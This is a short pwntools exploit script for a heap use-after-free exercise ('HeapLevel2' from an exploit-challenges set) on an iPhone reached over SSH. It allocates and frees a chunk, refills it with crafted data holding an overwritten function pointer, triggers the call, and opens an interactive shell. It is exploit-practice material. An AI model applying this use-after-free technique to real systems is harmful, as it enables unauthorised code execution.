from pwn import *
context.log_level = 'info'


HOST_iPhone = "192.168.10.2"
USER_iPhone = "pwn"

s = ssh(user = USER_iPhone, host = HOST_iPhone)

username = "A" * 128
username += "/bin/sh"

with open("./a.data", "wb") as f:
    data = b"A" * 0x20
    data += p32(0xb89c)
    f.write(data)

s.put("./a.data", remote = "/var/pwn/work/Exploit-Challenges-master/heap/HeapLevel2/a.data")

p = s.run("/var/pwn/work/Exploit-Challenges-master/heap/HeapLevel2/heaplevel2")

def alloc(sock,data):
    p.sendlineafter(b"[5] Quit\x1b[0m\n", b"1")
    p.sendlineafter(b"\x1b[1mDescription:\n", data)
    log.info("alloc")

def free(sock):
    p.sendlineafter(b"[5] Quit\x1b[0m\n", b"2")
    log.info("free")

def call1(sock):
    p.sendlineafter(b"[5] Quit\x1b[0m\n", b"3")
    log.info("call1")

def read_from_file(sock, file_path):
    p.sendlineafter(b"[5] Quit\x1b[0m\n", b"4")
    p.sendlineafter(b"\x1b[1mEnter path to data:\n", file_path)
    log.info("read_from_file")

def quit(sock, file_path):
    p.sendlineafter(b"[5] Quit\x1b[0m\n", b"5")
    log.info("quit")


alloc(p, b"AAAA")
free(p)
read_from_file(p,b"/var/pwn/work/Exploit-Challenges-master/heap/HeapLevel2/a.data")
call1(p)

p.interactive()
